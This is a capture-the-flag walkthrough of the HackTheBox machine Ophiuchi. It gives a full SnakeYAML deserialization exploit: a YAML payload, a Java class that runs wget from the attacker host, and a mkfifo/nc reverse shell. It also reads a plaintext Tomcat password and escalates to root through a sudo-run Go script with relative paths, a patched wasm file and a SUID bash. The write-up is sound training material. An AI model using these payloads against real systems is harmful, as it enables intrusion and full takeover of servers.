# User

Ophiuchi is a medium rated machine on HackTheBox created by [felamos](https://www.hackthebox.eu/home/users/profile/27390). In this walkthrough we will abuse insecure deserialization in a yaml parser to gain an initial foothold. After that we use the obtained tomcat credentials to ssh in as the admin user. For the root part we will abuse the use of relative paths in a go script we are allowed to run as root, changing a variable in a wasm file to switch the code path it takes. 

## Nmap

As usual we start our enumeration off with a nmap scan against all ports, followed by a script and version detection scan against the open ones.

`All ports scan`
```
$ sudo nmap -p- -T4 10.129.167.24

## Yaml deserialization

There are only 2 ports open on the target machine, with tomcat being the biggest possible chance for success, so we will start there. Opening the page in our webbrowser we are greeted with a yaml parser on the homepage.

[![homepage.png](/img/ophiuchi/homepage.png)](/img/ophiuchi/homepage.png)

This might be vulnerable to deserialization if the base constructor is used for the yaml class. Following [this](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) blogpost we can test if we can make the server connect back to our machine with this piece of yaml. 

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.19/test"]
  ]]
]
```

We stand up a python webserver on the port we specified in our yaml payload.

```
$sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then enter our yaml payload in the website and click on `Parse`.

[![probing.png](/img/ophiuchi/probing.png)](/img/ophiuchi/probing.png)

We get redirected to a page stating that the feature has been temporarily disabled due to security reasons.

[![disabled.png](/img/ophiuchi/disabled.png)](/img/ophiuchi/disabled.png)

However looking on our webserver we can see a hit from the target trying to get the file we specified.

```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.167.24 - - [03/Jul/2021 03:31:25] code 404, message File not found
10.129.167.24 - - [03/Jul/2021 03:31:25] "GET /test HTTP/1.1" 404 -
```

Following the blogpost further, we can use artsploit's [yaml-payload repository](https://github.com/artsploit/yaml-payload) to generate payloads for rce on the server. 

Following the documentation for the tool we modify the `AwesomeScriptEngineFactory` function in the `src/artsploit/AwesomeScriptEngineFactory.java` file.  In a first step we will use it to upload the `shell` file we prepared to the `/tmp` directory of the webserver.

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("wget 10.10.14.19/shell -O /tmp/revsh.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }
...[snip]..
```

`shell`
```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 7575 >/tmp/f
```

After modifying the source we have to compile the code.

```
$ javac src/artsploit/AwesomeScriptEngineFactory.java
$ jar -cvf yaml-payload.jar -C src/ .
added manifest
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1478) (out= 389)(deflated 73%)
adding: artsploit/AwesomeScriptEngineFactory.class(in = 1605) (out= 666)(deflated 58%)
```

Now we set up a webserver hosting the resulting `yaml-payload.jar` and modify our yaml code to download and load the file.

```
sudo python3  -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.19/yaml-payload.jar"]
  ]]
]
```

[![trigger.png](/img/ophiuchi/trigger.png)](/img/ophiuchi/trigger.png)

The deserilization seems to work and we get a hit on our server for our `shell` file right after the hit for the `yaml-payload.jar`.

```
$sudo python3  -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.167.24 - - [03/Jul/2021 03:50:56] "GET /yaml-payload.jar HTTP/1.1" 200 -
10.129.167.24 - - [03/Jul/2021 03:50:56] "GET /yaml-payload.jar HTTP/1.1" 200 -
10.129.167.24 - - [03/Jul/2021 03:50:56] "GET /shell HTTP/1.1" 200 -
```

With our reverse shell code being on the target we only have to execute it in a second step. We do this by simply calling `bash` on the file we downloaded earlier. First we modify the source code again.

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("bash /tmp/revsh.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
...[snip]...
```

Recompile ...

```
$ javac src/artsploit/AwesomeScriptEngineFactory.java
$ jar -cvf yaml-payload.jar -C src/ .
added manifest
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1478) (out= 389)(deflated 73%)
adding: artsploit/AwesomeScriptEngineFactory.class(in = 1605) (out= 666)(deflated 58%)
```

Set up a listener this time on the specified port to catch our reverse shell and also set up our webserver again to serve the payload.

```
$nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

```
$sudo python3  -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

[![trigger.png](/img/ophiuchi/trigger.png)](/img/ophiuchi/trigger.png)

Sending our yaml to parse it we get a callback on our webserver for the payload and a reverse shell on our listener. 

```
$sudo python3  -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.167.24 - - [03/Jul/2021 03:51:54] "GET /yaml-payload.jar HTTP/1.1" 200 -
10.129.167.24 - - [03/Jul/2021 03:51:54] "GET /yaml-payload.jar HTTP/1.1" 200 -
```

For easier access we upgrade our reverse shell as the tomcat user and fix the terminal size.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575

## Tomcat credentials

Tomcat often stores credentials in plaintext format in the `tomcat-users.xml` file. This is also the case here and we get ssh access as the admin user on the machine.

```
tomcat@ophiuchi:/$ cat /opt/tomcat/conf/tomcat-users.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--
...[snip]...
        version="1.0">
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
<!--
...[snip]...
```

```

```

Logged in as the admin user we are greeted with the user flag in his home directory.

```
admin@ophiuchi:~$ wc -c user.txt 
33 user.txt
```

# Root

## WASM

Checking for sudo right we see that admin is allowed to execute `go run` as root on `/opt/wasm-functions/index.go`.

```
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

The code imports the `main.wasm` web assembly file. Then the exported info function get's assigned to a variable and called. The result of this call is later converted to a string and compared to `"1"`. If it isn't equal the program prints `"Not ready to deploy"`  and exits. If it passes the check `/bin/sh` is called on the file `deploy.sh` which is not referenced by an absolute path. This means if we can both create our own custom `main.wasm` and `deploy.sh` and lead it down another code path, it executes the code we specify in the `deploy.sh` file.

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

To not have to write the wasm from scratch we copy over the existing `main.wasm` file with scp.

```
$ scp admin@10.129.167.24:/opt/wasm-functions/main.wasm .
admin@10.129.167.24's password: 
main.was
```

Looking at it with [this](https://webassembly.github.io/wabt/demo/wasm2wat/index.html) tool on github we can convert the wasm to wat and see the return value for the info function is hardcoded to `0`.

[![wasm2wat.png](/img/ophiuchi/wasm2wat.png)](/img/ophiuchi/wasm2wat.png)

Using the [corresponding](https://webassembly.github.io/wabt/demo/wat2wasm/index.html) tool to generate wasm from wat, we can change the value to `1` and download the generated wasm file.

[![change_int.png](/img/ophiuchi/change_int.png)](/img/ophiuchi/change_int.png)

We scp this file over to a directory we have write access to.

```
$ scp www/main.wasm admin@10.129.167.24:/dev/shm/main.wasm
admin@10.129.167.24's password: 
main.wasm
```

In this directory we also create a `deploy.sh` script, which is the code we want to run as  root. In this case we simply give bash the suid bit	 as a simple method to obtain root.

`deploy.sh`

```bash
#!/bin/bash
chmod +s /bin/bash
```

With all preparations met we can now do a `go run` with sudo on `/opt/wasm-functions/index.go`
 
```
admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy

```

Checking bash, we see it has now the suid bit set.

```
admin@ophiuchi:/dev/shm$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Feb 25  2020 /bin/bash
```

This gives us easy access as the root user and we can add the rootflag to our collection.

```
admin@ophiuchi:/dev/shm$ /bin/bash -p
bash-5.0# id
uid=1000(admin) gid=1000(admin) euid=0(root) egid=0(root) groups=0(root),1000(admin)
bash-5.0# wc -c /root/root.txt
33 /root/root.txt
```
